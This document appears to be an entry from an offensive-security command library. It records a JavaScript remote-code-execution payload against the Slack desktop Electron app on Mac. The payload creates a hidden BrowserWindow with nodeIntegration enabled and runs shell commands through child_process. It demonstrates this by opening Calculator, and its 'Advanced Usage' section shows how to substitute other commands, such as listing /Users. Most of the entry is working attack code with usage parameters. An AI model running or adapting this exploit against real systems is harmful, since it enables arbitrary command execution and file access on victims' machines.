---
id: cmd-electron-rce-mac
data: >-
  window.desktop.delegate = {}

  window.desktop.delegate.canOpenURLInWindow = () => true

  window.desktop.window = {}

  window.desktop.window.open = () => 1

  bw = window.open('about:blank')

  nbw = new bw.constructor({show: false, webPreferences: {nodeIntegration:
  true}})

  nbw.loadURL('about:blank')

  nbw.webContents.executeJavaScript('this.require("child_process").exec("open
  /Applications/Calculator.app")')
tags:
  - rce
  - electron
type: command
output: null
executor: javascript
platforms:
  - Mac
  - Desktop (Electron)
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:15.138Z'
verified: false
validated: true
submitted: true
---
# electron-browserwindow-rce-mac

## Command

```javascript
window.desktop.delegate = {}
window.desktop.delegate.canOpenURLInWindow = () => true
window.desktop.window = {}
window.desktop.window.open = () => 1
bw = window.open('about:blank')
nbw = new bw.constructor({show: false, webPreferences: {nodeIntegration: true}})
nbw.loadURL('about:blank')
nbw.webContents.executeJavaScript('this.require("child_process").exec("open /Applications/Calculator.app")')
```

## Description

This JavaScript command manipulates the Electron BrowserWindow in Slack desktop to enable nodeIntegration and execute a shell command on Mac, demonstrating RCE by opening Calculator.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| exec | Shell command to run via child_process, e.g., "open /Applications/Calculator.app" | Yes |
| nodeIntegration | Set to true in webPreferences to enable Node.js | Yes |
| show | false for hidden window | Yes |

## Examples

### Basic Usage

```javascript
// As above, opens Calculator
```

### Advanced Usage

Replace exec with custom command, e.g., 'ls -la' for file access.

```javascript
nbw.webContents.executeJavaScript('this.require("child_process").exec("ls -la /Users")')
```

## Expected Output

Calculator app launches on the user's Mac machine, confirming RCE.

## Related

- [[commands/child-process-exec-windows]]
- [[procedures/Trigger-Redirect-and-RCE-in-Desktop-App]]
